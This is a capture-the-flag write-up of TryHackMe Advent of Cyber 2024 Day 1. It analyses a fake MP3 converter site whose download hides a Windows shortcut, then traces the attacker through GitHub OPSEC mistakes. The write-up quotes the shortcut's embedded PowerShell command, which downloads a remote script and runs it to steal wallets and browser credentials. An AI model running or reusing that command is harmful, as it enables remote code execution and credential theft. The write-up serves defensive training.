# 🎄 TryHackMe Advent of Cyber 2024 – Day 1: OPSEC Challenge


## Challenge Overview 🎅

Day 1 of the **Advent of Cyber 2024** starts off strong by taking us through an investigation into a suspicious YouTube to MP3 converter website. The goal is to analyze downloaded files, uncover malicious behavior, and track down the attacker by following their OPSEC mistakes. Along the way, I explored:
- Metadata analysis with tools like `exiftool`
- Unpacking and inspecting PowerShell scripts
- Tracing digital breadcrumbs back to their source

This was a fun and hands-on start to the month!

## Objectives 🎯

1. Investigate the suspicious website and analyze how it works.
2. Look into the files downloaded from the site for anything malicious.
3. Trace the attacker’s identity using GitHub and highlight their OPSEC blunders.


## Step 1: Investigating the Website

The website, hosted at `10.10.200.221`, looked like a standard YouTube to MP3 converter. Here’s what I did:
1. Opened the site in the AttackBox and noticed the “About” page credited its creator as **“The Glitch.”**
2. Pasted a YouTube link into the form to download a file named `download.zip`.
3. Extracted the ZIP file and found two files inside:
   - **`song.mp3`**
   - **`somg.mp3`**

At this point, everything seemed normal, but the odd filename `somg.mp3` caught my attention.

## Step 2: File Analysis Using ExifTool 🔍

### Analyzing `song.mp3`

I started with the seemingly legitimate file, running:

```
exiftool song.mp3
```

**Result:**
- The file was confirmed to be a regular MP3 with standard metadata.
- Nothing unusual or malicious here—just an audio file.


### Analyzing `somg.mp3`

The suspiciously named `somg.mp3` was next. I ran:

```
exiftool somg.mp3
```

**Result:**
- This wasn’t an MP3 at all! It was actually a Windows Shortcut file (`.lnk`).
- The metadata revealed an embedded PowerShell command:

```
-ep Bypass -nop -c "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/MM-WarevilleTHM/IS/refs/heads/main/IS.ps1','C:\ProgramData\s.ps1'); iex (Get-Content 'C:\ProgramData\s.ps1' -Raw)"
```

This command is clearly malicious—it bypasses PowerShell execution policies, downloads a script from a remote URL, and executes it on the victim’s machine.

## Step 3: Opening `somg.mp3` in Browser 🌐

To learn more, I opened the URL embedded in the PowerShell command:

[https://raw.githubusercontent.com/MM-WarevilleTHM/IS/refs/heads/main/IS.ps1](https://raw.githubusercontent.com/MM-WarevilleTHM/IS/refs/heads/main/IS.ps1)

**Script Analysis:**
- The script collects sensitive data, such as:
  - Cryptocurrency wallet files
  - Browser credentials
- This stolen data is sent to a **Command and Control (C2) server** hosted by the attacker.

## Step 4: Tracing the Attacker on GitHub 🔗

The PowerShell script contained a signature:

```
"Created by the one and only M.M."
```

### GitHub Search

I searched GitHub for this signature:

```
"Created by the one and only M.M."
```

This led me to:
- A repository owned by **M.M.**
- GitHub Issues where M.M. interacted publicly, leaving a digital trail.

### Revealing the Attacker’s Identity

By following M.M.’s activity on GitHub, I uncovered:
1. **Real Name:** The attacker’s profile included their real name.
2. **Repositories:** They hosted malicious scripts publicly.
3. **Comments:** M.M.’s interactions in Issues sections tied their GitHub account to the malware.

## Key Findings 🔑

1. **Legitimate File:** `song.mp3` was harmless.
2. **Malicious File:** `somg.mp3` contained a PowerShell command to execute a malicious script.
3. **C2 Server:** The attacker’s script sent stolen data to a remote server.
4. **Attacker Identity:** Poor OPSEC practices on GitHub exposed "M.M."

## Lessons Learned 🌟

### OPSEC Failures

This challenge was a great reminder of how attackers often slip up:
- **Reused Aliases:** M.M. used the same username across platforms.
- **Identifiable Metadata:** Including a signature in the script made it traceable.
- **Public Interactions:** Commenting on GitHub linked M.M.’s activity to their malware.

### Tools and Techniques

Some of the key tools and steps I used:
- **`exiftool`:** To extract metadata and uncover the PowerShell command.
- **Browser Inspection:** To investigate URLs and find additional clues.
- **GitHub Search:** To trace the attacker and identify their OPSEC mistakes.

## Final Thoughts 🎁

Day 1 of the Advent of Cyber series kicked off with a solid introduction to metadata analysis, malicious script investigation, and tracking down an attacker’s identity. It was a great mix of technical analysis and detective work, and I’m excited to see what challenges Day 2 will bring!

- [Main Page](README.md)
- [Day 2: Log Analysis](day2.md)
- [Day 3: Log Analysis](day3.md)
- [Day 4: Atomic Red Team](day4.md)
- [Day 5: XXE](day5.md)
- [Day 6: Sandboxes](day6.md)
- [More Days to Come!](#)
